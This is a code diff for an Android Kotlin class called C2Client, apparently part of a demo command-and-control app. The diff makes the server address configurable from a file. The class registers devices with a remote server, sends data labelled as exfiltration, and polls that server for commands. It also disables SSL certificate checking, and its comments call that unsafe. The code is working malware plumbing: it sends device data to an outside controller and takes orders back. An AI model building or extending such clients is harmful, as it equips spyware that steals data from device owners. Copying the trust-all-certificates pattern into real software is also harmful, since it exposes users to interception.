@@ -37,6 +37,9 @@ class C2Client(private val context: Context) {
     private var notificationCounter = 0
     
     init {
+        // Initialize C2Config to load the IP from file
+        C2Config.initialize(context)
+        
         // Trust all SSL certificates for the demo
         // NOTE: This is extremely insecure and should NEVER be done in a real app!
         // This is only done here to simplify the demo without proper certificate handling
@@ -50,9 +53,8 @@ class C2Client(private val context: Context) {
         
         // Log initialization for debugging
         Log.d(TAG, "C2Client initialized with deviceId: $deviceId")
-        Log.d(TAG, "Using HTTPS endpoint: ${C2Config.SERVER_URL}")
-        Log.d(TAG, "Using HTTP endpoint: ${C2Config.HTTP_SERVER_URL}")
-        Log.d(TAG, "Using local endpoint: ${C2Config.LOCAL_SERVER_URL}")
+        Log.d(TAG, "Using server IP: ${C2Config.getServerIp()}")
+        Log.d(TAG, "Using server URL: ${C2Config.getServerUrl()}")
     }
     
     /**
@@ -80,14 +82,12 @@ class C2Client(private val context: Context) {
         // Log the data we're going to send for debugging
         Log.d(TAG, "Registration data: $registrationData")
         
-        // For emulator testing, make direct connection to host through 10.0.2.2:42069
-        Log.d(TAG, "Connecting to C2 on emulator special address: http://10.0.2.2:42069/register")
-        SendDataTask("http://10.0.2.2:42069/register", registrationData.toString()).execute()
+        // Send to the dynamically configured server
+        val serverUrl = C2Config.getServerUrl()
+        val registrationEndpoint = C2Config.getRegistrationEndpoint()
         
-        // Try configured URLs as fallback
-        Log.d(TAG, "Trying configured endpoints")
-        SendDataTask("${C2Config.SERVER_URL}/register", registrationData.toString()).execute()
-        SendDataTask("${C2Config.EMULATOR_SERVER_URL}/register", registrationData.toString()).execute()
+        Log.d(TAG, "Connecting to C2 server at: $registrationEndpoint")
+        SendDataTask(registrationEndpoint, registrationData.toString()).execute()
     }
     
     /**
@@ -111,14 +111,11 @@ class C2Client(private val context: Context) {
         // Log for debugging
         Log.d(TAG, "Exfiltration data (first 100 chars): ${jsonStr.take(100)}...")
         
-        // For emulator testing, make direct connection to host through 10.0.2.2:42069
-        Log.d(TAG, "Sending to C2 on emulator special address: http://10.0.2.2:42069/exfil")
-        SendDataTask("http://10.0.2.2:42069/exfil", jsonStr).execute()
+        // Send to the dynamically configured server
+        val exfiltrationEndpoint = C2Config.getExfiltrationEndpoint()
         
-        // Try configured URLs as fallback
-        Log.d(TAG, "Trying configured endpoints")
-        SendDataTask("${C2Config.EXFILTRATION_ENDPOINT}", jsonStr).execute()
-        SendDataTask("${C2Config.EMULATOR_SERVER_URL}/exfil", jsonStr).execute()
+        Log.d(TAG, "Sending to C2 server at: $exfiltrationEndpoint")
+        SendDataTask(exfiltrationEndpoint, jsonStr).execute()
     }
     
     /**
@@ -141,14 +138,11 @@ class C2Client(private val context: Context) {
         // Log for debugging
         Log.d(TAG, "Command request data: $requestStr")
         
-        // For emulator testing, make direct connection to host through 10.0.2.2:42069
-        Log.d(TAG, "Checking commands on emulator special address: http://10.0.2.2:42069/command")
-        GetCommandsTask(callback, "http://10.0.2.2:42069/command").execute(requestStr)
+        // Send to the dynamically configured server
+        val commandEndpoint = C2Config.getCommandEndpoint()
         
-        // Try configured URLs as fallback
-        Log.d(TAG, "Trying configured endpoints")
-        GetCommandsTask(callback, C2Config.COMMAND_ENDPOINT).execute(requestStr)
-        GetCommandsTask(callback, "${C2Config.EMULATOR_SERVER_URL}/command").execute(requestStr)
+        Log.d(TAG, "Checking commands on C2 server at: $commandEndpoint")
+        GetCommandsTask(callback, commandEndpoint).execute(requestStr)
     }
     
     /**
@@ -285,31 +279,31 @@ class C2Client(private val context: Context) {
                     // Try to read any response
                     var responseData = ""
                     try {
-                    val inputStream = if (responseCode >= 400) {
-                        Log.d(TAG, "Reading from error stream due to error code: $responseCode")
-                        connection.errorStream ?: connection.inputStream
-                    } else {
-                        connection.inputStream
-                    }
-                    
-                        // Read the response data completely
-                    val reader = BufferedReader(InputStreamReader(inputStream))
-                    val response = StringBuilder()
-                    var line: String? = null
-                    while (reader.readLine().also { line = it } != null) {
-                    response.append(line).append("\n")
-                    }
-                    responseData = response.toString()
-                    
-                    // Log response completely for debugging
-                    if (responseData.isNotEmpty()) {
-                        Log.d(TAG, "Full response body from $endpoint: $responseData")
-                    } else {
-                        Log.d(TAG, "No response body from $endpoint")
+                        val inputStream = if (responseCode >= 400) {
+                            Log.d(TAG, "Reading from error stream due to error code: $responseCode")
+                            connection.errorStream ?: connection.inputStream
+                        } else {
+                            connection.inputStream
                         }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Error reading response from $endpoint", e)
-                }
+                        
+                        // Read the response data completely
+                        val reader = BufferedReader(InputStreamReader(inputStream))
+                        val response = StringBuilder()
+                        var line: String? = null
+                        while (reader.readLine().also { line = it } != null) {
+                            response.append(line).append("\n")
+                        }
+                        responseData = response.toString()
+                        
+                        // Log response completely for debugging
+                        if (responseData.isNotEmpty()) {
+                            Log.d(TAG, "Full response body from $endpoint: $responseData")
+                        } else {
+                            Log.d(TAG, "No response body from $endpoint")
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error reading response from $endpoint", e)
+                    }
                     
                     return Pair(responseCode == HttpURLConnection.HTTP_OK, responseData)
                 } catch (e: Exception) {
